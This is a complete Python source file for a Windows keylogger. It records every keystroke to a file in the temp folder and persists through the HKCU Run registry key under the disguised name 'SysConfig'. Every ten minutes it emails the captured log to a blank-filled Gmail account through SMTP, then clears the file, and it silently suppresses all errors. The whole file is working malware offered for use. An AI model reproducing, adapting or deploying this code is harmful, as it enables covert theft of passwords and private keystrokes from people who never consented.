from pynput.keyboard import Listener
import threading
import time
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from datetime import datetime, timedelta

import os 
import sys
import winreg as reg

import tempfile

def change_working_directory():
    exe_directory = tempfile.gettempdir()
    os.chdir(exe_directory)

def add_to_registry():
    exe_path = os.path.realpath(sys.argv[0])
    key = reg.HKEY_CURRENT_USER
    key_value = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
    
    try:
        open_key = reg.OpenKey(key, key_value, 0, reg.KEY_ALL_ACCESS)
        reg.SetValueEx(open_key, "SysConfig", 0, reg.REG_SZ, exe_path)
        reg.CloseKey(open_key)
    except Exception:
        pass

def is_in_registry():
    key = reg.HKEY_CURRENT_USER
    key_value = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
    try:
        open_key = reg.OpenKey(key, key_value, 0, reg.KEY_READ)
        value, regtype = reg.QueryValueEx(open_key, "SysConfig")
        reg.CloseKey(open_key)
        if value == os.path.realpath(sys.argv[0]):
            return True
    except FileNotFoundError:
        return False
    return False

def send_email():
    from_email = "" 
    to_email = ""
    password = ""

    timestamp_to = datetime.now().strftime("%H:%M")
    timestamp_from = (datetime.now() - timedelta(minutes=10)).strftime("%Y-%m-%d %H:%M")

    msg = MIMEMultipart()
    msg['From'] = from_email
    msg['To'] = to_email
    msg['Subject'] = f"Keylogger logs {timestamp_from} - {timestamp_to}"

    try:
        with open(log_file_path, "r") as file:
            log_content = file.read()
            msg.attach(MIMEText(log_content, 'plain'))
    except FileNotFoundError:
        log_content = "Log file not found."
        msg.attach(MIMEText(log_content, 'plain'))

    try:
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login(from_email, password)
        server.send_message(msg)
        server.quit()
    except Exception:
        pass

def clear_log_file():
    with open(log_file_path , "w"):
        pass

def email_sender_thread():
    try:
        while True:
            time.sleep(600)
            send_email()
            clear_log_file()
    except Exception:
        pass

def on_press(key): 
    try:
        with open(log_file_path , "a") as log_file:
            system_time = datetime.now()
            log_file.write(f"{system_time}: {key}\n")
    except Exception:
        pass

def main():
    if not is_in_registry():
        add_to_registry()
    
    change_working_directory()

    global log_file_path
    log_file_path = os.path.join(tempfile.gettempdir(), "keylogs.txt")

    threading.Thread(target=email_sender_thread, daemon=True).start()

    try:
        with Listener(on_press=on_press) as listener:
            listener.join()
    except KeyboardInterrupt:
        pass
    except Exception:
        pass

if __name__ == "__main__":
    main()